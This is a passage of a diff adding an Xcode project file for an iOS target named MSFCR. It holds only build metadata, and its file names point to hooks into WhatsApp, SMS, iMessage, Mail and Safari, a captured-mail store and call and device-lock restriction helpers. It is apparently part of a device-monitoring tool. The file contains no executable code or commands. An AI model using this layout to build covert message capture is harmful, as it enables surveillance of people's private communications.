@@ -1,0 +1,916 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 45;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		0829D8B415B565AD00D724B3 /* SafariUtils.m in Sources */ = {isa = PBXBuildFile; fileRef = 0829D8B315B565AD00D724B3 /* SafariUtils.m */; };
+		08586B4B15BFB24500E65917 /* WhatsAppUtils.m in Sources */ = {isa = PBXBuildFile; fileRef = 08586B4815BFB24500E65917 /* WhatsAppUtils.m */; };
+		08586B4C15BFB24500E65917 /* WhatsAppAccountInfo.m in Sources */ = {isa = PBXBuildFile; fileRef = 08586B4A15BFB24500E65917 /* WhatsAppAccountInfo.m */; };
+		0868A70D15C17B2100A00122 /* WhatsAppBlockEventStore.m in Sources */ = {isa = PBXBuildFile; fileRef = 0868A70C15C17B2100A00122 /* WhatsAppBlockEventStore.m */; };
+		088B946B16438B2A0024A426 /* EmailUtils.m in Sources */ = {isa = PBXBuildFile; fileRef = 088B946A16438B2A0024A426 /* EmailUtils.m */; };
+		089E8D2815BFFD78004558D2 /* WhatsAppDBUtils.m in Sources */ = {isa = PBXBuildFile; fileRef = 089E8D2715BFFD78004558D2 /* WhatsAppDBUtils.m */; };
+		175E3A24158F054F000B9C4B /* libFxStd.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 175E3A23158F0533000B9C4B /* libFxStd.a */; };
+		175E3A25158F0554000B9C4B /* libRestrictionManagerUtils.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 175E3A1A158F0527000B9C4B /* libRestrictionManagerUtils.a */; };
+		175E3A26158F0559000B9C4B /* libIPC.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 175E3A11158F051A000B9C4B /* libIPC.a */; };
+		178E449D1590761B00017210 /* libPreferences.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 178E445B1590760F00017210 /* libPreferences.a */; };
+		178E44BA1590766200017210 /* libFMDB.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 178E44B91590765C00017210 /* libFMDB.a */; };
+		178E44C8159076B300017210 /* libsqlite3.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 178E44C7159076B300017210 /* libsqlite3.dylib */; };
+		17D3626A1591B16700E0EAB6 /* CallRestrictionHelper.m in Sources */ = {isa = PBXBuildFile; fileRef = 17D362691591B16700E0EAB6 /* CallRestrictionHelper.m */; };
+		17F2B7F1159028C4005C5B21 /* RestrictionHandler.m in Sources */ = {isa = PBXBuildFile; fileRef = 17F2B7F0159028C4005C5B21 /* RestrictionHandler.m */; };
+		17F2BA5115906F6B005C5B21 /* SMSUtils.m in Sources */ = {isa = PBXBuildFile; fileRef = 17F2BA4F15906F6B005C5B21 /* SMSUtils.m */; };
+		35A170B815B42AF3008DF7C3 /* libFxEvents.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 35A170B715B42AC8008DF7C3 /* libFxEvents.a */; };
+		35A860D015DCAE2400B5E384 /* libCryptography.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 35A860CF15DCAE1900B5E384 /* libCryptography.a */; };
+		35AFBA2715AFC418005A04B4 /* ChatKit in Frameworks */ = {isa = PBXBuildFile; fileRef = 35AFBA2615AFC418005A04B4 /* ChatKit */; };
+		35B0B868162FF1AB007B7DCD /* MSFCR.plist in Resources */ = {isa = PBXBuildFile; fileRef = 35B0B867162FF1AB007B7DCD /* MSFCR.plist */; };
+		35B6FAAD1599938F000C6E9B /* CallManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 35B6FAAC1599938F000C6E9B /* CallManager.m */; };
+		35B6FBF01599B13D000C6E9B /* CoreTelephony in Frameworks */ = {isa = PBXBuildFile; fileRef = 35B6FBEF1599B13D000C6E9B /* CoreTelephony */; };
+		35B6FBF81599B164000C6E9B /* libTelephonyNotification.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 35B6FABB159993A6000C6E9B /* libTelephonyNotification.a */; };
+		35C14AA2159465F800EE72AB /* libDeviceLockManagerUtil.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 35C14AA1159465EE00EE72AB /* libDeviceLockManagerUtil.a */; };
+		35CA19E41619552F00060E12 /* SpringBoardServices in Frameworks */ = {isa = PBXBuildFile; fileRef = 35CA19E31619552F00060E12 /* SpringBoardServices */; };
+		35DC2E0F164CFC7100800BB6 /* MIME in Frameworks */ = {isa = PBXBuildFile; fileRef = 35DC2E0E164CFC7100800BB6 /* MIME */; };
+		35DF001D1640EBA000DBB4B7 /* Message.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 35DF001C1640EBA000DBB4B7 /* Message.framework */; };
+		35DF002B1640EF5600DBB4B7 /* CapturedMailDAO.m in Sources */ = {isa = PBXBuildFile; fileRef = 35DF002A1640EF5600DBB4B7 /* CapturedMailDAO.m */; };
+		35FCF8EB15AD590100333C1E /* ConversationListUtils.m in Sources */ = {isa = PBXBuildFile; fileRef = 35FCF8EA15AD590100333C1E /* ConversationListUtils.m */; };
+		35FCFAFE15ADA1C100333C1E /* MessageManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 35FCFAFD15ADA1C100333C1E /* MessageManager.m */; };
+		851F89700F78271600A6C185 /* MSFCR.mm in Sources */ = {isa = PBXBuildFile; fileRef = 851F896F0F78271600A6C185 /* MSFCR.mm */; };
+		851F89900F7827DC00A6C185 /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 851F898F0F7827DC00A6C185 /* Foundation.framework */; };
+		851F89E10F7827E700A6C185 /* UIKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 851F89E00F7827E700A6C185 /* UIKit.framework */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		175E3A10158F051A000B9C4B /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 175E3A09158F051A000B9C4B /* IPC.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = IPC;
+		};
+		175E3A19158F0527000B9C4B /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 175E3A12158F0527000B9C4B /* RestrictionManagerUtils.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = RestrictionManagerUtils;
+		};
+		175E3A22158F0533000B9C4B /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 175E3A1B158F0533000B9C4B /* FxStd.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = FxStd;
+		};
+		175E3A27158F0560000B9C4B /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 175E3A09158F051A000B9C4B /* IPC.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = IPC;
+		};
+		175E3A29158F0563000B9C4B /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 175E3A12158F0527000B9C4B /* RestrictionManagerUtils.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = RestrictionManagerUtils;
+		};
+		175E3A2B158F0563000B9C4B /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 175E3A1B158F0533000B9C4B /* FxStd.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = FxStd;
+		};
+		178E445A1590760F00017210 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 178E44531590760F00017210 /* Preferences.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = Preferences;
+		};
+		178E44B61590765C00017210 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 178E44AD1590765C00017210 /* fmdb.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 8DD76FA10486AA7600D96B5E;
+			remoteInfo = fmdb;
+		};
+		178E44B81590765C00017210 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 178E44AD1590765C00017210 /* fmdb.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = EE4290EF12B42F870088BD94;
+			remoteInfo = FMDB;
+		};
+		178E44BB1590766C00017210 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 178E44AD1590765C00017210 /* fmdb.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = EE4290EE12B42F870088BD94;
+			remoteInfo = FMDB;
+		};
+		178E44BD1590766C00017210 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 178E44531590760F00017210 /* Preferences.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = Preferences;
+		};
+		35A170B615B42AC8008DF7C3 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 35A170B215B42AC8008DF7C3 /* FxEvents.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = FxEvents;
+		};
+		35A170B915B42B07008DF7C3 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 35A170B215B42AC8008DF7C3 /* FxEvents.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = FxEvents;
+		};
+		35A860CE15DCAE1900B5E384 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 35A860C715DCAE1900B5E384 /* Cryptography.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = Cryptography;
+		};
+		35A860D115DCAE2E00B5E384 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 35A860C715DCAE1900B5E384 /* Cryptography.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = Cryptography;
+		};
+		35B6FABA159993A6000C6E9B /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 35B6FAB3159993A6000C6E9B /* TelephonyNotification.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = TelephonyNotification;
+		};
+		35B6FBF61599B154000C6E9B /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 35B6FAB3159993A6000C6E9B /* TelephonyNotification.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = TelephonyNotification;
+		};
+		35C14AA0159465EE00EE72AB /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 35C14A99159465EE00EE72AB /* DeviceLockManagerUtil.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = DeviceLockManagerUtil;
+		};
+		35C14AA3159465FD00EE72AB /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 35C14A99159465EE00EE72AB /* DeviceLockManagerUtil.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = DeviceLockManagerUtil;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		0829D8B215B565AD00D724B3 /* SafariUtils.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SafariUtils.h; sourceTree = "<group>"; };
+		0829D8B315B565AD00D724B3 /* SafariUtils.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SafariUtils.m; sourceTree = "<group>"; };
+		083A46BE15944DBD00E40605 /* AlertLockHook.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = AlertLockHook.h; sourceTree = "<group>"; };
+		08586B0315BFB06200E65917 /* WhatsAppHook.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = WhatsAppHook.h; sourceTree = "<group>"; };
+		08586B4715BFB24500E65917 /* WhatsAppUtils.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = WhatsAppUtils.h; sourceTree = "<group>"; };
+		08586B4815BFB24500E65917 /* WhatsAppUtils.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = WhatsAppUtils.m; sourceTree = "<group>"; };
+		08586B4915BFB24500E65917 /* WhatsAppAccountInfo.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = WhatsAppAccountInfo.h; sourceTree = "<group>"; };
+		08586B4A15BFB24500E65917 /* WhatsAppAccountInfo.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = WhatsAppAccountInfo.m; sourceTree = "<group>"; };
+		0868A70B15C17B2100A00122 /* WhatsAppBlockEventStore.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = WhatsAppBlockEventStore.h; sourceTree = "<group>"; };
+		0868A70C15C17B2100A00122 /* WhatsAppBlockEventStore.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = WhatsAppBlockEventStore.m; sourceTree = "<group>"; };
+		088B946916438B2A0024A426 /* EmailUtils.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = EmailUtils.h; sourceTree = "<group>"; };
+		088B946A16438B2A0024A426 /* EmailUtils.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = EmailUtils.m; sourceTree = "<group>"; };
+		088C4F7C160879E100B68331 /* SettingsHook.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SettingsHook.h; sourceTree = "<group>"; };
+		089E8D2615BFFD78004558D2 /* WhatsAppDBUtils.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = WhatsAppDBUtils.h; sourceTree = "<group>"; };
+		089E8D2715BFFD78004558D2 /* WhatsAppDBUtils.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = WhatsAppDBUtils.m; sourceTree = "<group>"; };
+		175E3A09158F051A000B9C4B /* IPC.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = IPC.xcodeproj; path = "../../IPC/Source-IPC/IPC.xcodeproj"; sourceTree = SOURCE_ROOT; };
+		175E3A12158F0527000B9C4B /* RestrictionManagerUtils.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = RestrictionManagerUtils.xcodeproj; path = "../../RestrictionManager/Source-RestrictionManagerUtils/RestrictionManagerUtils.xcodeproj"; sourceTree = SOURCE_ROOT; };
+		175E3A1B158F0533000B9C4B /* FxStd.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = FxStd.xcodeproj; path = ../../Std/FxStd/FxStd.xcodeproj; sourceTree = SOURCE_ROOT; };
+		178E44531590760F00017210 /* Preferences.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = Preferences.xcodeproj; path = "../../Preferences/Source-Preferences/Preferences.xcodeproj"; sourceTree = SOURCE_ROOT; };
+		178E44AD1590765C00017210 /* fmdb.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = fmdb.xcodeproj; path = "../../ccgus-fmdb-606b29d/fmdb.xcodeproj"; sourceTree = SOURCE_ROOT; };
+		178E44C7159076B300017210 /* libsqlite3.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libsqlite3.dylib; path = usr/lib/libsqlite3.dylib; sourceTree = SDKROOT; };
+		17D3617215917CF100E0EAB6 /* iMessageHook.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = iMessageHook.h; sourceTree = "<group>"; };
+		17D362681591B16700E0EAB6 /* CallRestrictionHelper.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = CallRestrictionHelper.h; sourceTree = "<group>"; };
+		17D362691591B16700E0EAB6 /* CallRestrictionHelper.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = CallRestrictionHelper.m; sourceTree = "<group>"; };
+		17F2B7EF159028C4005C5B21 /* RestrictionHandler.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RestrictionHandler.h; sourceTree = "<group>"; };
+		17F2B7F0159028C4005C5B21 /* RestrictionHandler.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RestrictionHandler.m; sourceTree = "<group>"; };
+		17F2B80715902C9A005C5B21 /* RestrictionHeaders.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RestrictionHeaders.h; sourceTree = "<group>"; };
+		17F2B8CE15903CB1005C5B21 /* SpringBoardHook.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SpringBoardHook.h; sourceTree = "<group>"; };
+		17F2B8D115903CBB005C5B21 /* MailHook.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = MailHook.h; sourceTree = "<group>"; };
+		17F2B8D715903D07005C5B21 /* SafariHook.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SafariHook.h; sourceTree = "<group>"; };
+		17F2BA4E15906F6B005C5B21 /* SMSUtils.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SMSUtils.h; sourceTree = "<group>"; };
+		17F2BA4F15906F6B005C5B21 /* SMSUtils.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SMSUtils.m; sourceTree = "<group>"; };
+		32CA4F630368D1EE00C91783 /* MSFCR_Prefix.pch */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = MSFCR_Prefix.pch; sourceTree = "<group>"; };
+		35A170B215B42AC8008DF7C3 /* FxEvents.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = FxEvents.xcodeproj; path = ../../Events/FxEvents/FxEvents.xcodeproj; sourceTree = SOURCE_ROOT; };
+		35A860C715DCAE1900B5E384 /* Cryptography.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = Cryptography.xcodeproj; path = "../../Cryptography/Source-Cryptography/Cryptography.xcodeproj"; sourceTree = SOURCE_ROOT; };
+		35AFBA2615AFC418005A04B4 /* ChatKit */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = ChatKit; path = ../../OTC/Frameworks/iOS4/ChatKit/ChatKit; sourceTree = SOURCE_ROOT; };
+		35B0B867162FF1AB007B7DCD /* MSFCR.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = MSFCR.plist; sourceTree = "<group>"; };
+		35B6FAAB1599938F000C6E9B /* CallManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = CallManager.h; sourceTree = "<group>"; };
+		35B6FAAC1599938F000C6E9B /* CallManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = CallManager.m; sourceTree = "<group>"; };
+		35B6FAB3159993A6000C6E9B /* TelephonyNotification.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = TelephonyNotification.xcodeproj; path = "../../TelephonyNotification/Source-TelephonyNotification/TelephonyNotification.xcodeproj"; sourceTree = SOURCE_ROOT; };
+		35B6FBEF1599B13D000C6E9B /* CoreTelephony */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = CoreTelephony; path = ../../OTC/Frameworks/iOS3/CoreTelephony.framework/CoreTelephony; sourceTree = SOURCE_ROOT; };
+		35C148901594186A00EE72AB /* SMSHook.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SMSHook.h; sourceTree = "<group>"; };
+		35C1489A15941A1F00EE72AB /* MSFCR.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = MSFCR.h; path = classes/MSFCR.h; sourceTree = SOURCE_ROOT; };
+		35C14A99159465EE00EE72AB /* DeviceLockManagerUtil.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = DeviceLockManagerUtil.xcodeproj; path = "../../DeviceLockManager/Source-DeviceLockManagerUtils/DeviceLockManagerUtil.xcodeproj"; sourceTree = SOURCE_ROOT; };
+		35CA19E31619552F00060E12 /* SpringBoardServices */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = SpringBoardServices; path = ../../OTC/Frameworks/iOS3/SpringBoardServices.framework/SpringBoardServices; sourceTree = SOURCE_ROOT; };
+		35DC2E0E164CFC7100800BB6 /* MIME */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = MIME; path = ../../OTC/Frameworks/iOS3/MIME.framework/MIME; sourceTree = SOURCE_ROOT; };
+		35DF001C1640EBA000DBB4B7 /* Message.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Message.framework; path = /Developer_xcode_3.2_3.2.3_sdk_3.1_4.0.2/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.0.sdk/System/Library/PrivateFrameworks/Message.framework; sourceTree = "<absolute>"; };
+		35DF00291640EF5600DBB4B7 /* CapturedMailDAO.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = CapturedMailDAO.h; path = "../../MSFSP/Source-MSFSP/classes/MailUtils/CapturedMailDAO.h"; sourceTree = SOURCE_ROOT; };
+		35DF002A1640EF5600DBB4B7 /* CapturedMailDAO.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = CapturedMailDAO.m; path = "../../MSFSP/Source-MSFSP/classes/MailUtils/CapturedMailDAO.m"; sourceTree = SOURCE_ROOT; };
+		35FCF8E915AD590100333C1E /* ConversationListUtils.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = ConversationListUtils.h; sourceTree = "<group>"; };
+		35FCF8EA15AD590100333C1E /* ConversationListUtils.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = ConversationListUtils.m; sourceTree = "<group>"; };
+		35FCFAFC15ADA1C100333C1E /* MessageManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = MessageManager.h; sourceTree = "<group>"; };
+		35FCFAFD15ADA1C100333C1E /* MessageManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = MessageManager.m; sourceTree = "<group>"; };
+		85198FE10F780FA700C450C3 /* MSFCR.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = MSFCR.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		851F896F0F78271600A6C185 /* MSFCR.mm */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.cpp.objcpp; name = MSFCR.mm; path = Classes/MSFCR.mm; sourceTree = SOURCE_ROOT; };
+		851F89770F78276800A6C185 /* MSFCR-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "MSFCR-Info.plist"; sourceTree = SOURCE_ROOT; };
+		851F898F0F7827DC00A6C185 /* Foundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Foundation.framework; path = System/Library/Frameworks/Foundation.framework; sourceTree = SDKROOT; };
+		851F89E00F7827E700A6C185 /* UIKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = UIKit.framework; path = System/Library/Frameworks/UIKit.framework; sourceTree = SDKROOT; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		1D60588F0D05DD3D006BFB54 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				35A860D015DCAE2400B5E384 /* libCryptography.a in Frameworks */,
+				35A170B815B42AF3008DF7C3 /* libFxEvents.a in Frameworks */,
+				35B6FBF81599B164000C6E9B /* libTelephonyNotification.a in Frameworks */,
+				35C14AA2159465F800EE72AB /* libDeviceLockManagerUtil.a in Frameworks */,
+				178E44BA1590766200017210 /* libFMDB.a in Frameworks */,
+				178E449D1590761B00017210 /* libPreferences.a in Frameworks */,
+				175E3A26158F0559000B9C4B /* libIPC.a in Frameworks */,
+				175E3A25158F0554000B9C4B /* libRestrictionManagerUtils.a in Frameworks */,
+				175E3A24158F054F000B9C4B /* libFxStd.a in Frameworks */,
+				851F89900F7827DC00A6C185 /* Foundation.framework in Frameworks */,
+				851F89E10F7827E700A6C185 /* UIKit.framework in Frameworks */,
+				178E44C8159076B300017210 /* libsqlite3.dylib in Frameworks */,
+				35B6FBF01599B13D000C6E9B /* CoreTelephony in Frameworks */,
+				35AFBA2715AFC418005A04B4 /* ChatKit in Frameworks */,
+				35CA19E41619552F00060E12 /* SpringBoardServices in Frameworks */,
+				35DF001D1640EBA000DBB4B7 /* Message.framework in Frameworks */,
+				35DC2E0F164CFC7100800BB6 /* MIME in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		080E96DDFE201D6D7F000001 /* Classes */ = {
+			isa = PBXGroup;
+			children = (
+				35C1489A15941A1F00EE72AB /* MSFCR.h */,
+				851F896F0F78271600A6C185 /* MSFCR.mm */,
+			);
+			path = Classes;
+			sourceTree = "<group>";
+		};
+		0829D8A215B5658B00D724B3 /* Safari Utils */ = {
+			isa = PBXGroup;
+			children = (
+				0829D8B215B565AD00D724B3 /* SafariUtils.h */,
+				0829D8B315B565AD00D724B3 /* SafariUtils.m */,
+			);
+			name = "Safari Utils";
+			sourceTree = "<group>";
+		};
+		083A46BC15944DA500E40605 /* AlertLock */ = {
+			isa = PBXGroup;
+			children = (
+				083A46BD15944DB200E40605 /* Hooks */,
+			);
+			name = AlertLock;
+			sourceTree = "<group>";
+		};
+		083A46BD15944DB200E40605 /* Hooks */ = {
+			isa = PBXGroup;
+			children = (
+				083A46BE15944DBD00E40605 /* AlertLockHook.h */,
+			);
+			name = Hooks;
+			sourceTree = "<group>";
+		};
+		08586B4D15BFB24800E65917 /* WhatsAppUtils */ = {
+			isa = PBXGroup;
+			children = (
+				08586B0315BFB06200E65917 /* WhatsAppHook.h */,
+				088C4F7C160879E100B68331 /* SettingsHook.h */,
+				08586B4715BFB24500E65917 /* WhatsAppUtils.h */,
+				08586B4815BFB24500E65917 /* WhatsAppUtils.m */,
+				089E8D2615BFFD78004558D2 /* WhatsAppDBUtils.h */,
+				089E8D2715BFFD78004558D2 /* WhatsAppDBUtils.m */,
+				08586B4915BFB24500E65917 /* WhatsAppAccountInfo.h */,
+				08586B4A15BFB24500E65917 /* WhatsAppAccountInfo.m */,
+				0868A70B15C17B2100A00122 /* WhatsAppBlockEventStore.h */,
+				0868A70C15C17B2100A00122 /* WhatsAppBlockEventStore.m */,
+			);
+			name = WhatsAppUtils;
+			sourceTree = "<group>";
+		};
+		175E3A0A158F051A000B9C4B /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				175E3A11158F051A000B9C4B /* libIPC.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		175E3A13158F0527000B9C4B /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				175E3A1A158F0527000B9C4B /* libRestrictionManagerUtils.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		175E3A1C158F0533000B9C4B /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				175E3A23158F0533000B9C4B /* libFxStd.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		178E44541590760F00017210 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				178E445B1590760F00017210 /* libPreferences.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		178E44AE1590765C00017210 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				178E44B71590765C00017210 /* fmdb */,
+				178E44B91590765C00017210 /* libFMDB.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		17D363EF1591EDAC00E0EAB6 /* Hooks */ = {
+			isa = PBXGroup;
+			children = (
+				17F2B8CE15903CB1005C5B21 /* SpringBoardHook.h */,
+				17F2B8D715903D07005C5B21 /* SafariHook.h */,
+				17D3617215917CF100E0EAB6 /* iMessageHook.h */,
+				35C148901594186A00EE72AB /* SMSHook.h */,
+			);
+			name = Hooks;
+			sourceTree = "<group>";
+		};
+		17D363F01591EDB700E0EAB6 /* Restriction Utils */ = {
+			isa = PBXGroup;
+			children = (
+				35DFFFEE1640E76F00DBB4B7 /* EmailUtils */,
